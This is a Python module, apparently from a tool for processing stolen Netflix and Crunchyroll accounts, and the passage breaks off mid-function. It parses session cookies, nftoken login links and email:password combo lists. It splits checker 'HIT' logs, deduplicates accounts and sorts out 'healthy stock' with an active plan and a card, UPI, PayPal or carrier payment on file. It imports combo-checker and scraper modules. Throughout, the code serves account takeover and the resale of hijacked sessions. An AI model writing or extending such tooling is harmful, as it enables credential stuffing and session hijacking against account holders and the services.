import io
import json
import os
import re
import subprocess
import tempfile
import zipfile

import combo_checker
import scraper

COUNTRY_MAP = {
    "AF": "Afghanistan 🇦🇫",
    "AL": "Albania 🇦🇱",
    "DZ": "Algeria 🇩🇿",
    "AD": "Andorra 🇦🇩",
    "AO": "Angola 🇦🇴",
    "AG": "Antigua and Barbuda 🇦🇬",
    "AR": "Argentina 🇦🇷",
    "AM": "Armenia 🇦🇲",
    "AU": "Australia 🇦🇺",
    "AT": "Austria 🇦🇹",
    "AZ": "Azerbaijan 🇦🇿",
    "BS": "Bahamas 🇧🇸",
    "BH": "Bahrain 🇧🇭",
    "BD": "Bangladesh 🇧🇩",
    "BB": "Barbados 🇧🇧",
    "BY": "Belarus 🇧🇾",
    "BE": "Belgium 🇧🇪",
    "BZ": "Belize 🇧🇿",
    "BJ": "Benin 🇧🇯",
    "BT": "Bhutan 🇧🇹",
    "BO": "Bolivia 🇧🇴",
    "BA": "Bosnia and Herzegovina 🇧🇦",
    "BW": "Botswana 🇧🇼",
    "BR": "Brazil 🇧🇷",
    "BN": "Brunei 🇧🇳",
    "BG": "Bulgaria 🇧🇬",
    "BF": "Burkina Faso 🇧🇫",
    "BI": "Burundi 🇧🇮",
    "KH": "Cambodia 🇰🇭",
    "CM": "Cameroon 🇨🇲",
    "CA": "Canada 🇨🇦",
    "CV": "Cape Verde 🇨🇻",
    "CF": "Central African Republic 🇨🇫",
    "TD": "Chad 🇹🇩",
    "CL": "Chile 🇨🇱",
    "CN": "China 🇨🇳",
    "CO": "Colombia 🇨🇴",
    "KM": "Comoros 🇰🇲",
    "CG": "Congo 🇨🇬",
    "CD": "DR Congo 🇨🇩",
    "CR": "Costa Rica 🇨🇷",
    "CI": "Côte d'Ivoire 🇨🇮",
    "HR": "Croatia 🇭🇷",
    "CU": "Cuba 🇨🇺",
    "CW": "Curaçao 🇨🇼",
    "CY": "Cyprus 🇨🇾",
    "CZ": "Czech Republic 🇨🇿",
    "DK": "Denmark 🇩🇰",
    "DJ": "Djibouti 🇩🇯",
    "DM": "Dominica 🇩🇲",
    "DO": "Dominican Republic 🇩🇴",
    "EC": "Ecuador 🇪🇨",
    "EG": "Egypt 🇪🇬",
    "SV": "El Salvador 🇸🇻",
    "GQ": "Equatorial Guinea 🇬🇶",
    "ER": "Eritrea 🇪🇷",
    "EE": "Estonia 🇪🇪",
    "SZ": "Eswatini 🇸🇿",
    "ET": "Ethiopia 🇪🇹",
    "FJ": "Fiji 🇫🇯",
    "FI": "Finland 🇫🇮",
    "FR": "France 🇫🇷",
    "GA": "Gabon 🇬🇦",
    "GM": "Gambia 🇬🇲",
    "GE": "Georgia 🇬🇪",
    "DE": "Germany 🇩🇪",
    "GH": "Ghana 🇬🇭",
    "GI": "Gibraltar 🇬🇮",
    "GR": "Greece 🇬🇷",
    "GD": "Grenada 🇬🇩",
    "GP": "Guadeloupe 🇬🇵",
    "GT": "Guatemala 🇬🇹",
    "GN": "Guinea 🇬🇳",
    "GW": "Guinea-Bissau 🇬🇼",
    "GY": "Guyana 🇬🇾",
    "GF": "French Guiana 🇬🇫",
    "PF": "French Polynesia 🇵🇫",
    "HT": "Haiti 🇭🇹",
    "HN": "Honduras 🇭🇳",
    "HK": "Hong Kong 🇭🇰",
    "HU": "Hungary 🇭🇺",
    "IS": "Iceland 🇮🇸",
    "IN": "India 🇮🇳",
    "ID": "Indonesia 🇮🇩",
    "IR": "Iran 🇮🇷",
    "IQ": "Iraq 🇮🇶",
    "IE": "Ireland 🇮🇪",
    "IL": "Israel 🇮🇱",
    "IT": "Italy 🇮🇹",
    "JM": "Jamaica 🇯🇲",
    "JP": "Japan 🇯🇵",
    "JO": "Jordan 🇯🇴",
    "KZ": "Kazakhstan 🇰🇿",
    "KE": "Kenya 🇰🇪",
    "KI": "Kiribati 🇰🇮",
    "KW": "Kuwait 🇰🇼",
    "KG": "Kyrgyzstan 🇰🇬",
    "LA": "Laos 🇱🇦",
    "LV": "Latvia 🇱🇻",
    "LB": "Lebanon 🇱🇧",
    "LS": "Lesotho 🇱🇸",
    "LR": "Liberia 🇱🇷",
    "LY": "Libya 🇱🇾",
    "LI": "Liechtenstein 🇱🇮",
    "LT": "Lithuania 🇱🇹",
    "LU": "Luxembourg 🇱🇺",
    "MO": "Macao 🇲🇴",
    "MG": "Madagascar 🇲🇬",
    "MW": "Malawi 🇲🇼",
    "MY": "Malaysia 🇲🇾",
    "MV": "Maldives 🇲🇻",
    "ML": "Mali 🇲🇱",
    "MT": "Malta 🇲🇹",
    "MQ": "Martinique 🇲🇶",
    "MR": "Mauritania 🇲🇷",
    "MU": "Mauritius 🇲🇺",
    "MX": "Mexico 🇲🇽",
    "MD": "Moldova 🇲🇩",
    "MC": "Monaco 🇲🇨",
    "MN": "Mongolia 🇲🇳",
    "ME": "Montenegro 🇲🇪",
    "MA": "Morocco 🇲🇦",
    "MZ": "Mozambique 🇲🇿",
    "MM": "Myanmar 🇲🇲",
    "NA": "Namibia 🇳🇦",
    "NP": "Nepal 🇳🇵",
    "NL": "Netherlands 🇳🇱",
    "NC": "New Caledonia 🇳🇨",
    "NZ": "New Zealand 🇳🇿",
    "NI": "Nicaragua 🇳🇮",
    "NE": "Niger 🇳🇪",
    "NG": "Nigeria 🇳🇬",
    "MK": "North Macedonia 🇲🇰",
    "NO": "Norway 🇳🇴",
    "OM": "Oman 🇴🇲",
    "PK": "Pakistan 🇵🇰",
    "PS": "Palestine 🇵🇸",
    "PA": "Panama 🇵🇦",
    "PG": "Papua New Guinea 🇵🇬",
    "PY": "Paraguay 🇵🇾",
    "PE": "Peru 🇵🇪",
    "PH": "Philippines 🇵🇭",
    "PL": "Poland 🇵🇱",
    "PT": "Portugal 🇵🇹",
    "PR": "Puerto Rico 🇵🇷",
    "QA": "Qatar 🇶🇦",
    "RE": "Réunion 🇷🇪",
    "RO": "Romania 🇷🇴",
    "RU": "Russia 🇷🇺",
    "RW": "Rwanda 🇷🇼",
    "SA": "Saudi Arabia 🇸🇦",
    "SN": "Senegal 🇸🇳",
    "RS": "Serbia 🇷🇸",
    "SC": "Seychelles 🇸🇨",
    "SL": "Sierra Leone 🇸🇱",
    "SG": "Singapore 🇸🇬",
    "SK": "Slovakia 🇸🇰",
    "SI": "Slovenia 🇸🇮",
    "SO": "Somalia 🇸🇴",
    "ZA": "South Africa 🇿🇦",
    "KR": "South Korea 🇰🇷",
    "SS": "South Sudan 🇸🇸",
    "ES": "Spain 🇪🇸",
    "LK": "Sri Lanka 🇱🇰",
    "SD": "Sudan 🇸🇩",
    "SR": "Suriname 🇸🇷",
    "SE": "Sweden 🇸🇪",
    "CH": "Switzerland 🇨🇭",
    "SY": "Syria 🇸🇾",
    "TW": "Taiwan 🇹🇼",
    "TJ": "Tajikistan 🇹🇯",
    "TZ": "Tanzania 🇹🇿",
    "TH": "Thailand 🇹🇭",
    "TL": "Timor-Leste 🇹🇱",
    "TG": "Togo 🇹🇬",
    "TO": "Tonga 🇹🇴",
    "TT": "Trinidad and Tobago 🇹🇹",
    "TN": "Tunisia 🇹🇳",
    "TR": "Turkey 🇹🇷",
    "TM": "Turkmenistan 🇹🇲",
    "UG": "Uganda 🇺🇬",
    "UA": "Ukraine 🇺🇦",
    "AE": "United Arab Emirates 🇦🇪",
    "GB": "United Kingdom 🇬🇧",
    "US": "United States 🇺🇸",
    "UY": "Uruguay 🇺🇾",
    "UZ": "Uzbekistan 🇺🇿",
    "VU": "Vanuatu 🇻🇺",
    "VE": "Venezuela 🇻🇪",
    "VN": "Vietnam 🇻🇳",
    "YE": "Yemen 🇾🇪",
    "ZM": "Zambia 🇿🇲",
    "ZW": "Zimbabwe 🇿🇼",
}


def get_full_country_name(raw: str) -> str:
    if not raw or str(raw).strip() in ["Unknown", "N/A", ""]:
        return "Unknown 🌐"
    s = str(raw).strip()
    upper = s.upper()

    # Direct 2-letter ISO lookup
    if upper in COUNTRY_MAP:
        return COUNTRY_MAP[upper]

    # Clean off existing flags or trailing code
    clean_name = re.sub(r"[\U0001F1E6-\U0001F1FF]{2}", "", s).strip()
    clean_upper = clean_name.upper()

    if clean_upper in COUNTRY_MAP:
        return COUNTRY_MAP[clean_upper]

    # Match by country name in COUNTRY_MAP values
    for code, full_name in COUNTRY_MAP.items():
        name_only = re.sub(r"[\U0001F1E6-\U0001F1FF]{2}", "", full_name).strip()
        if clean_upper == name_only.upper() or clean_upper.startswith(name_only.upper()):
            return full_name

    # Prefix 2-letter code check
    match = re.match(r"^([A-Za-z]{2})[\s_-]+", s)
    if match and match.group(1).upper() in COUNTRY_MAP:
        return COUNTRY_MAP[match.group(1).upper()]

    return s


def categorize_payment(payment_str, plan_str=""):
    """
    Categorizes the payment method while strictly differentiating between:
    - Paid accounts: CC (Visa, Master, Amex, etc.), UPI (Paytm, GPay, PhonePe, etc.),
      PAYPAL, APPLE, and TP (carrier/partner billing like Jio, Airtel, Vi, etc.)
    - Dead/unbilled accounts: FREE (free trials, zero plans) and N/A (no payment, removed payment, 0 payments).
    """
    plan = str(plan_str or "").lower().strip()
    # If no valid plan, categorizes as FREE
    if not plan or plan in ["unknown", "n/a", "none", "", "null", "0", "false", "free", "trial"]:
        return "FREE"

    if any(x in plan for x in ["free trial", "0 payment", "no plan"]):
        return "FREE"

    p = str(payment_str or "").lower().strip()

    # Explicit indicators of missing or zero payments -> N/A
    no_payment_patterns = [
        "unknown", "n/a", "none", "", "null", "0", "false",
        "0 payment", "0 payments", "no payment", "no payments",
        "no_payment", "nopayment", "without payment", "sin pago",
        "payment removed", "no card", "unbilled", "not billed",
        "missing", "sin tarjeta", "aucun", "nenhum", "keine zahlungsmethode"
    ]
    if p in no_payment_patterns or any(p.startswith(x) for x in ["0 payment", "no payment", "no-payment"]):
        return "N/A"

    # Explicit Free / Trial
    if any(x in p for x in ["free", "trial", "prueba gratis"]):
        return "FREE"

    # Explicit Credit / Debit Cards (PRIORITY SAFEGUARD)
    if any(x in p for x in [
        "visa", "mastercard", "master card", "master_card", "mc",
        "amex", "american express", "discover", "rupay", "jcb",
        "diners", "elo", "hipercard", "troy", "mir", "card", "debit", "credit", "cc", "dc"
    ]):
        return "CC"

    # Explicit UPI and Indian Mobile Wallets (PRIORITY SAFEGUARD)
    if any(x in p for x in [
        "upi", "paytm", "google pay", "gpay", "phonepe", "bhim",
        "amazon pay", "amazonpay", "mobikwik", "freecharge"
    ]) or " cred " in f" {p} ":
        return "UPI"

    # PayPal
    if "paypal" in p:
        return "PAYPAL"

    # Apple / iTunes billing
    if any(x in p for x in ["apple", "apple pay", "itunes", "ios"]):
        return "APPLE"

    # Carrier & Partner billing (Jio, Airtel, Vi, Vodafone, etc. - PRIORITY SAFEGUARD)
    partner_billings = [
        "jio", "airtel", "vi", "vodafone", "idea", "bsnl", "flipkart",
        "t-mobile", "tmobile", "verizon", "at&t", "att", "sprint", "orange",
        "telefonica", "movistar", "clarocaro", "claro", "tim", "vivo", "oi",
        "o2", "ee", "three", "sky", "bt", "virgin", "telstra", "optus",
        "rogers", "bell", "telus", "koodo", "fido", "shaw", "videotron",
        "sfr", "bouygues", "free mobile", "postepay", "windtre", "iliad",
        "turkcell", "turk telekom", "antel", "lowi", "masmovil", "yoigo",
        "digi", "proximus", "telenet", "kpn", "ziggo", "swisscom", "sunrise",
        "salt", "tele2", "yettel", "a1", "magenta", "partner", "bundle", "package"
    ]
    if any(x in p for x in partner_billings):
        return "TP"

    # If it is any non-empty string that does not mean "no payment", preserve as TP (Third Party)
    return "TP"


def is_healthy_stock(account_info: dict) -> bool:
    """
    Validates if an account has a real active plan AND a valid active payment method on file.
    Rejects dead stock / accounts expiring soon:
    - Missing or invalid plan
    - Missing / removed payment method (package == 'N/A' or categorizes to 'FREE'/'N/A')
    - Accounts on payment hold (hold_status == True or is_on_hold == True)
    - Accounts cancelled or scheduled to expire without payment (is_cancelled == True)
    - Accounts where paymentMethodMissing is detected
    """
    if not account_info or not isinstance(account_info, dict):
        return False

    plan = str(account_info.get("plan", "")).strip()
    if not plan or plan.lower() in ["n/a", "none", "", "unknown", "null", "0", "false"]:
        return False

    # Check for payment hold / failed payment (user on hold)
    if account_info.get("is_on_hold") or account_info.get("hold_status") in [True, "Yes", "true"]:
        return False

    # Check if membership was cancelled or payment is missing
    if account_info.get("is_cancelled") or account_info.get("is_payment_missing"):
        return False

    mem_status = str(account_info.get("membership_status", "")).strip().upper()
    if mem_status in ["CANCELLED", "FORMER_MEMBER", "NEVER_MEMBER", "ANONYMOUS"]:
        return False

    if account_info.get("is_free_trial"):
        return False

    # Check payment method: MUST have a valid active payment method
    package_str = str(account_info.get("package", "")).strip()
    payment_method = str(account_info.get("payment_method", "")).strip()
    masked_card = str(account_info.get("masked_card", "")).strip()

    category = categorize_payment(package_str, plan)
    if category in ["FREE", "N/A"]:
        return False

    # Check if payment was removed (both payment_method and masked_card are empty/NA)
    has_card = masked_card and masked_card.lower() not in ["n/a", "none", "unknown", ""]
    has_method = payment_method and payment_method.lower() not in ["n/a", "none", "unknown", "free trial", ""]
    if not has_card and not has_method and category not in ["CC", "PAYPAL", "UPI", "APPLE", "TP"]:
        return False

    return True


def is_confirmed_dead(account_info: dict) -> bool:
    """
    Returns True ONLY if an account is 100% definitively confirmed dead by Netflix.
    Returns False if there was a network error, rate limit, server error, or unknown state.
    PREVENTS FALSE-POSITIVE DELETIONS of valid active accounts!
    """
    if not account_info or not isinstance(account_info, dict):
        return False

    # Transient network or server errors MUST NEVER be marked as dead
    err = account_info.get("error")
    if err in ["rate_limit", "network_error", "server_error", "timeout"] or (err and str(err).startswith("http_5")):
        return False

    # Explicit confirmed dead signals
    if err in ["no_cookies", "login_redirect", "expired"]:
        return True

    mem_status = str(account_info.get("membership_status", "")).strip().upper()
    if mem_status in ["FORMER_MEMBER", "NEVER_MEMBER", "ANONYMOUS"]:
        return True

    # If Netflix successfully responded with 200 OK, but membership is cancelled or has no plan
    if account_info.get("is_cancelled") is True:
        return True

    plan = str(account_info.get("plan", "")).strip().lower()
    if plan in ["n/a", "none", "", "unknown", "null"]:
        return True

    # If account is on payment hold or failed payment retry
    if account_info.get("is_on_hold") is True or account_info.get("hold_status") in [True, "Yes", "true"]:
        return True

    # If plan is valid, but payment method is explicitly missing / removed
    if account_info.get("is_payment_missing") is True:
        return True

    category = categorize_payment(account_info.get("package", ""), plan)
    if category in ["FREE", "N/A"]:
        return True

    return False


def get_item_unique_fingerprint(item_str: str) -> str:
    """
    Extracts a unique fingerprint for an item (cookie/token/combo) to eliminate duplicates:
    - If Netflix cookies: uses NetflixId cookie value
    - If SecureNetflixId: uses SecureNetflixId value
    - If NF token / link: uses nftoken value (full base64 character set)
    - If combo email:pass: uses normalized lowercase email
    - Fallback: MD5 hash of cleaned content
    """
    s = str(item_str).strip()
    if not s:
        return ""

    # 1. NetflixId cookie (primary unique token for Netflix accounts)
    nid_m = re.search(r"(?:NetflixId|netflixid)[\t=:\s]+([^\t;\r\n\s\"]+)", s)
    if nid_m:
        val = nid_m.group(1).strip()
        if len(val) > 10:
            return f"netflixid:{val[:80]}"

    # 2. SecureNetflixId
    snid_m = re.search(r"(?:SecureNetflixId|securenetflixid)[\t=:\s]+([^\t;\r\n\s\"]+)", s)
    if snid_m:
        val = snid_m.group(1).strip()
        if len(val) > 10:
            return f"sec_netflixid:{val[:80]}"

    # 3. NFToken parameter or link (support full base64 characters +, /, =)
    token_m = re.search(r"nftoken=([a-zA-Z0-9%_\-+=/]+)", s, re.IGNORECASE)
    if token_m:
        val = token_m.group(1).strip()
        if len(val) > 10:
            return f"nftoken:{val[:80]}"

    # 4. Combo Email:Password
    combo_m = re.match(r"^([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):", s)
    if combo_m:
        return f"email:{combo_m.group(1).lower().strip()}"

    # 5. Crunchyroll etp_rt
    cr_m = re.search(r"(?:etp_rt)[\t=:\s]+([^\t;\r\n\s\"]+)", s)
    if cr_m:
        return f"crunchy:{cr_m.group(1)[:60]}"

    import hashlib

    return f"hash:{hashlib.md5(s.encode('utf-8', errors='ignore')).hexdigest()}"


def deduplicate_items(items: list) -> list:
    """Removes duplicate cookies, duplicate tokens, and duplicate combos while preserving order."""
    seen = set()
    deduped = []
    for item in items:
        fp = get_item_unique_fingerprint(item)
        if not fp:
            continue
        if fp not in seen:
            seen.add(fp)
            deduped.append(item)
    return deduped


def parse_netflix_cookies(content):
    """Parse Netflix cookies from various formats safely"""
    if not content:
        return []
    cookies = []

    # 1. Try JSON Array extraction
    try:
        start_idx = content.find("[")
        end_idx = content.rfind("]")
        if start_idx != -1 and end_idx != -1 and end_idx > start_idx:
            json_str = content[start_idx : end_idx + 1]
            json_data = json.loads(json_str)
            src = json_data if isinstance(json_data, list) else [json_data]
            for item in src:
                if isinstance(item, dict):
                    name = item.get("name") or item.get("Name")
                    value = item.get("value") or item.get("Value")
                    domain = item.get("domain") or item.get("Domain") or ".netflix.com"
                    path = item.get("path") or item.get("Path") or "/"
                    if name and value:
                        cookies.append(
                            {
                                "name": str(name),
                                "value": str(value),
                                "domain": str(domain),
                                "path": str(path),
                                "secure": True,
                                "httpOnly": True,
                            }
                        )
    except Exception:
        pass

    if cookies:
        return cookies

    # 2. Try generic name=value extraction
    try:
        pairs = re.findall(r"([^=;\s]+)\s*=\s*([^;\n\r]+)", content)
        if pairs:
            names_lower = {n.lower() for n, _ in pairs}
            has_netflix_keys = any(k in names_lower for k in ["netflixid", "securenetflixid"]) or any(
                "netflix" in n for n in names_lower
            )
            if has_netflix_keys:
                for name, value in pairs:
                    name = name.strip()
                    value = value.strip().strip('"')
                    if not name or not value:
                        continue
                    if any(bad in name for bad in ["/", "?", ":", "http", "www", " ", "<", ">"]):
                        continue
                    if name.lower() in ["netflixid", "securenetflixid", "nfvdid", "optimizelyenduserid"] or ("netflix" in name.lower() and len(name) < 30):
                        cookies.append(
                            {
                                "name": name,
                                "value": value,
                                "domain": ".netflix.com",
                                "path": "/",
                                "secure": True,
                                "httpOnly": True,
                            }
                        )
    except Exception:
        pass

    if cookies:
        return cookies

    # 3. Handle lines starting with Cookie: header
    try:
        for line in content.split("\n"):
            if line.lower().startswith("cookie:"):
                header = line.split(":", 1)[1]
                for pair in header.split(";"):
                    if "=" in pair:
                        name, value = pair.split("=", 1)
                        if name.strip() and value.strip():
                            cookies.append(
                                {
                                    "name": name.strip(),
                                    "value": value.strip().strip('"'),
                                    "domain": ".netflix.com",
                                    "path": "/",
                                    "secure": True,
                                    "httpOnly": True,
                                }
                            )
    except Exception:
        pass

    if cookies:
        return cookies

    # 4. Fallback: Parse Netscape format
    try:
        lines = content.split("\n")
        for line in lines:
            line = line.strip()
            if line and not line.startswith("#") and "netflix.com" in line:
                parts = line.split("\t") if "\t" in line else line.split()
                if len(parts) >= 7:
                    domain, _, path, secure, expiration, name, value = parts[:7]

                    try:
                        exp_int = int(expiration)
                    except ValueError:
                        exp_int = 1788198674

                    cookies.append(
                        {
                            "name": name,
                            "value": value,
                            "domain": domain,
                            "path": path,
                            "secure": str(secure).lower() == "true",
                            "httpOnly": True,
                            "expirationDate": exp_int,
                        }
                    )
    except Exception:
        pass

    return cookies


def parse_crunchyroll_cookies(content):
    """Parse Crunchyroll cookies and/or etp_rt token from various formats safely"""
    if not content:
        return []
    cookies = []

    # 1. Try JSON Array extraction
    try:
        start_idx = content.find("[")
        end_idx = content.rfind("]")
        if start_idx != -1 and end_idx != -1 and end_idx > start_idx:
            json_str = content[start_idx : end_idx + 1]
            json_data = json.loads(json_str)
            src = json_data if isinstance(json_data, list) else [json_data]
            for item in src:
                if isinstance(item, dict):
                    name = item.get("name") or item.get("Name")
                    value = item.get("value") or item.get("Value")
                    domain = item.get("domain") or item.get("Domain") or ".crunchyroll.com"
                    path = item.get("path") or item.get("Path") or "/"
                    if name and value:
                        cookies.append(
                            {
                                "name": str(name),
                                "value": str(value),
                                "domain": str(domain),
                                "path": str(path),
                                "secure": True,
                                "httpOnly": True,
                            }
                        )
    except Exception:
        pass

    if cookies:
        return cookies

    # 2. Generic name=value extraction
    try:
        pairs = re.findall(r"([^=;\s]+)\s*=\s*([^;\n\r]+)", content)
        if pairs:
            names_lower = {n.lower() for n, _ in pairs}
            has_crunchy_keys = any(k in names_lower for k in ["etp_rt", "c_variation", "session_id"]) or any(
                "crunchy" in n for n in names_lower
            )
            if has_crunchy_keys:
                for name, value in pairs:
                    if name and value:
                        cookies.append(
                            {
                                "name": name.strip(),
                                "value": value.strip().strip('"'),
                                "domain": ".crunchyroll.com",
                                "path": "/",
                                "secure": True,
                                "httpOnly": True,
                            }
                        )
    except Exception:
        pass

    if cookies:
        return cookies

    # 3. Cookie: header lines
    try:
        for line in content.split("\n"):
            if line.lower().startswith("cookie:"):
                header = line.split(":", 1)[1]
                for pair in header.split(";"):
                    if "=" in pair:
                        name, value = pair.split("=", 1)
                        if name.strip() and value.strip():
                            cookies.append(
                                {
                                    "name": name.strip(),
                                    "value": value.strip().strip('"'),
                                    "domain": ".crunchyroll.com",
                                    "path": "/",
                                    "secure": True,
                                    "httpOnly": True,
                                }
                            )
    except Exception:
        pass

    if cookies:
        return cookies

    # 4. Netscape format
    try:
        lines = content.split("\n")
        for line in lines:
            line = line.strip()
            if line and not line.startswith("#") and ("crunchyroll.com" in line or "etp_rt" in line):
                parts = line.split("\t") if "\t" in line else line.split()
                if len(parts) >= 7:
                    domain, _, path, secure, expiration, name, value = parts[:7]
                    try:
                        exp_int = int(expiration)
                    except ValueError:
                        exp_int = 1788198674
                    cookies.append(
                        {
                            "name": name,
                            "value": value,
                            "domain": domain,
                            "path": path,
                            "secure": str(secure).lower() == "true",
                            "httpOnly": True,
                            "expirationDate": exp_int,
                        }
                    )
    except Exception:
        pass

    if cookies:
        return cookies

    # 5. Raw etp_rt match
    m = re.search(r'etp_rt\s*=\s*([^\s;\'"\r\n]+)', content)
    if m:
        cookies.append(
            {
                "name": "etp_rt",
                "value": m.group(1).strip(),
                "domain": ".crunchyroll.com",
                "path": "/",
                "secure": True,
                "httpOnly": True,
                "expirationDate": 1788198674,
            }
        )

    return cookies


COMMON_HEADERS = {
    "checked", "hits", "source", "generated", "price", "plan", "country", "payment",
    "phone", "profiles", "streams", "quality", "member", "next", "extra", "hold",
    "status", "cookie", "cookies", "token", "direct", "link", "tv", "pc", "url",
    "format", "process", "email", "pass", "password", "user", "username", "account",
    "login", "name", "type", "card", "id", "date", "time", "total", "valid", "invalid",
}


def parse_combo_line(line: str):
    """Parses a single line for username:password or email:password, ignoring headers and junk."""
    line = line.strip()
    if not line or len(line) < 5:
        return None
    if line.startswith(
        ("#", ".", "http://", "https://", "Cookie:", "[", "{", "<", "FORMAT", "PROCESS", "~", "=", "-", "*", "!", "/", "•", "👤", "📱", "💻", "📺")
    ):
        return None

    # 1. Pipe format combo with metadata (e.g., user@domain.com:password | Plan = ... | Country = ...)
    if "|" in line:
        m = re.match(r"^([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})[:;|\t]([^\s|;]+)", line)
        if m:
            u, p = m.group(1).strip(), m.group(2).strip()
            if p and not p.startswith(("http://", "https://")):
                return f"{u}:{p}"

    # 2. Standard email combo: user@domain.com:password
    m = re.match(r"^([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})[:;|\t]([^\r\n]+)$", line)
    if m:
        u, p = m.group(1).strip(), m.group(2).strip()
        if p and not p.startswith(("http://", "https://")):
            return f"{u}:{p}"

    # 3. Username combo: alphanumeric 3-30 chars without spaces or punctuation
    if "|" in line:
        m = re.match(r"^([a-zA-Z0-9_]{3,30})[:;|\t]([^\s|;]+)", line)
    else:
        m = re.match(r"^([a-zA-Z0-9_]{3,30})[:;|\t]([^\r\n]+)$", line)
    if m:
        u, p = m.group(1).strip(), m.group(2).strip()
        if u.lower() not in COMMON_HEADERS and p and len(p) >= 3 and not p.startswith(("http://", "https://")):
            return f"{u}:{p}"

    return None


def extract_items_from_text(content: str) -> list:
    """
    Universal smart item extractor that detects and accurately splits:
    - Multi-account HIT logs (Netflix HIT NO.1, Account Details:, box borders)
    - Direct Watch / NF Token link lists
    - "Valid Cookie" delimiter blocks
    - JSON Array of cookies
    - Netscape cookie blocks
    - Single account text files
    - Line-by-line combos and standalone tokens
    """
    content = content.replace("\r\n", "\n").replace("\r", "\n").strip()
    if not content:
        return []

    # 1. JSON Array of cookies (single item or list)
    if content.startswith("[") and content.endswith("]"):
        try:
            parsed = json.loads(content)
            if isinstance(parsed, list):
                return [content]
        except Exception:
            pass

    # 2. "Valid Cookie" delimiter format (e.g. from nfhunt output)
    if "Valid Cookie" in content:
        raw_blocks = content.split("Valid Cookie")
        items = []
        for b in raw_blocks:
            b_str = b.strip()
            if not b_str:
                continue
            if "nftoken=" in b_str and not ("\t" in b_str or "NetflixId=" in b_str):
                match = re.search(r"https?://[^\s]*netflix\.com[^\s]*nftoken=[^\s]+|https?://[^\s]*nftoken=[^\s]+", b_str)
                items.append(match.group(0).strip() if match else b_str)
            else:
                items.append("Valid Cookie\n\n" + b_str if not b_str.startswith("Valid Cookie") else b_str)
        if items:
            return deduplicate_items(items)

    # 3. SMART SECTION FILTER: Checker Hit logs / multi-account result formats
    # Check for HIT NO.x headers strictly at start of line
    hit_pat = re.compile(
        r"(?mi)^[ \t]*(?:[━=\-]{4,}\s*\n)?[ \t]*(?:Netflix\s+)?(?:HIT|ACCOUNT|RESULT)\s*(?:NO\.?|#|:)?\s*\d+",
        re.MULTILINE,
    )
    indices = [m.start() for m in hit_pat.finditer(content)]
    if len(indices) >= 2:
        blocks = []
        for i in range(len(indices)):
            start = indices[i]
            end = indices[i + 1] if i + 1 < len(indices) else len(content)
            chunk = content[start:end].strip()
            if chunk and (
                "netflixid" in chunk.lower()
                or "nftoken=" in chunk.lower()
                or "securenetflixid" in chunk.lower()
                or "email:" in chunk.lower()
            ):
                blocks.append(chunk)
        if len(blocks) >= 2:
            return deduplicate_items(blocks)

    # 4. Repeating Account Details: blocks
    acc_pat = re.compile(r"(?mi)^[ \t]*(?:[━=\-]{4,}\s*\n)?[ \t]*(?:👤\s*)?Account\s+Details:\s*$", re.MULTILINE)
    indices = [m.start() for m in acc_pat.finditer(content)]
    if len(indices) >= 2:
        blocks = []
        for i in range(len(indices)):
            start = indices[i]
            end = indices[i + 1] if i + 1 < len(indices) else len(content)
            chunk = content[start:end].strip()
            if chunk and (
                "netflixid" in chunk.lower()
                or "nftoken=" in chunk.lower()
                or "securenetflixid" in chunk.lower()
            ):
                blocks.append(chunk)
        if len(blocks) >= 2:
            return deduplicate_items(blocks)

    # 5. Direct Watch / Login Link separated blocks (e.g. alive_nftokens.txt)
    token_pat = re.compile(
        r"(?mi)^[ \t]*(?:Direct\s+Watch|Phone\s+Login|PC\s+Login|TV\s+Activation|Token\s+Link|Token):\s*https?://",
        re.MULTILINE,
    )
    indices = [m.start() for m in token_pat.finditer(content)]
    if len(indices) >= 2 and "netflixid" not in content.lower():
        blocks = []
        nftoken_regex = re.compile(r"(https?://[^\s]*netflix\.com[^\s]*nftoken=[^\s]+|https?://[^\s]*nftoken=[^\s]+)")
        for line in content.splitlines():
            m = nftoken_regex.search(line)
            if m:
                blocks.append(m.group(1))
        if blocks:
            return deduplicate_items(blocks)

    # 6. Multi-dash horizontal separators between accounts
    if re.search(r"\n[━=\-]{8,}\n", content):
        blocks = [b.strip() for b in re.split(r"\n[━=\-]{8,}\n", content) if b.strip()]
        valid_blocks = [
            b
            for b in blocks
            if ("netflixid" in b.lower() or "nftoken=" in b.lower() or "securenetflixid" in b.lower())
        ]
        if len(valid_blocks) >= 2:
            return deduplicate_items(valid_blocks)

    # 7. Check if predominantly Netscape cookie format (single file per account)
    lines = content.splitlines()
    netscape_lines = [
        line_str
        for line_str in lines
        if ("\t" in line_str or "TRUE\t" in line_str or "FALSE\t" in line_str) and not line_str.startswith("#")
    ]
    valid_non_comment = [line_str for line_str in lines if line_str.strip() and not line_str.strip().startswith("#")]

    if netscape_lines and len(netscape_lines) >= max(2, len(valid_non_comment) * 0.4):
        return [content]

    # 8. Fallback: Line-by-line combo & token extraction
    items = []
    current_cookie_lines = []
    nftoken_regex = re.compile(r"(https?://[^\s]*netflix\.com[^\s]*nftoken=[^\s]+|https?://[^\s]*nftoken=[^\s]+)")

    for line in lines:
        stripped = line.strip()
        if not stripped:
            if current_cookie_lines:
                items.append("\n".join(current_cookie_lines))
                current_cookie_lines = []
            continue

        if re.match(r"^[-=*#]{3,}$", stripped):
            if current_cookie_lines:
                items.append("\n".join(current_cookie_lines))
                current_cookie_lines = []
            continue

        # If the line contains full session cookies or direct token links alongside combo/metadata, preserve the whole line!
        has_session = (
            "netflixid=" in stripped.lower()
            or "securenetflixid=" in stripped.lower()
            or "cookies =" in stripped.lower()
            or "nftoken=" in stripped.lower()
        )
        if has_session:
            if current_cookie_lines:
                items.append("\n".join(current_cookie_lines))
                current_cookie_lines = []
            items.append(stripped)
            continue

        # Check for pure combo line
        parsed_combo = parse_combo_line(stripped)
        if parsed_combo:
            if current_cookie_lines:
                items.append("\n".join(current_cookie_lines))
                current_cookie_lines = []
            items.append(parsed_combo)
            continue

        # Check for token link
        token_match = nftoken_regex.search(stripped)
        if token_match:
            if current_cookie_lines:
                items.append("\n".join(current_cookie_lines))
                current_cookie_lines = []
            items.append(token_match.group(1))
            continue

        # If it's a Netscape line
        if "\t" in stripped and (
            ".netflix.com" in stripped or ".crunchyroll.com" in stripped or "TRUE" in stripped or "FALSE" in stripped
        ):
            current_cookie_lines.append(stripped)
        elif "netflixid=" in stripped.lower() or "securenetflixid=" in stripped.lower():
            current_cookie_lines.append(stripped)

